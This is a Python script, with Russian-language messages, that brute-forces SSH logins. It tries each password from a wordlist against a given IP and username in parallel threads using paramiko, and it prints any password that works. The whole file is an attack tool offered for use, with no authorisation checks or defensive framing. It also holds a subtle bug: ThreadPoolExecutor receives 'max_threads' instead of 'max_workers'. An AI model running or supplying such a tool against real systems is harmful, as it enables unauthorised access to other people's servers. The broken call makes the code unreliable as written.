import paramiko
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Tuple, Optional, List
import argparse

init(autoreset=True)


class SSHBruteForcer:
    def __init__(
        self, target_ip: str, username: str, password_file: str, max_threads: int = 10
    ):
        self.target_ip = target_ip
        self.username = username
        self.password_file = password_file
        self.max_threads = max_threads

    def try_password(self, password: str) -> Tuple[Optional[bool], str]:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.target_ip, username=self.username, password=password)
            return True, password
        except paramiko.AuthenticationException:
            return False, password
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Ошибка: {str(e)}{Style.RESET_ALL}")
            return None, str(e)

    def load_passwords(self) -> List[str]:
        with open(self.password_file, "r") as file:
            return [line.strip() for line in file]

    def run(self) -> None:
        passwords = self.load_passwords()

        with ThreadPoolExecutor(max_threads=self.max_threads) as executor:
            future_to_password = {
                executor.submit(self.try_password, password): password
                for password in passwords
            }

            for future in as_completed(future_to_password):
                result, password = future.result()
                if result is True:
                    print(f"{Fore.GREEN}[+] Пароль найден: {password}{Style.RESET_ALL}")
                    return
                elif result is False:
                    print(f"{Fore.RED}[-] Неверный пароль: {password}{Style.RESET_ALL}")

        print(f"{Fore.RED}[-] Пароль не найден в списке{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="SSH Брутфорс скрипт")
    parser.add_argument("target_ip", type=str, help="IP-адрес целевого сервера")
    parser.add_argument("username", type=str, help="Имя пользователя для SSH")
    parser.add_argument("password_file", type=str, help="Файл с паролями")
    parser.add_argument(
        "--max-threads",
        type=int,
        default=10,
        help="Максимальное количество потоков (по умолчанию: 10)",
    )

    args = parser.parse_args()

    brute_forcer = SSHBruteForcer(
        args.target_ip, args.username, args.password_file, args.max_threads
    )
    brute_forcer.run()


if __name__ == "__main__":
    main()
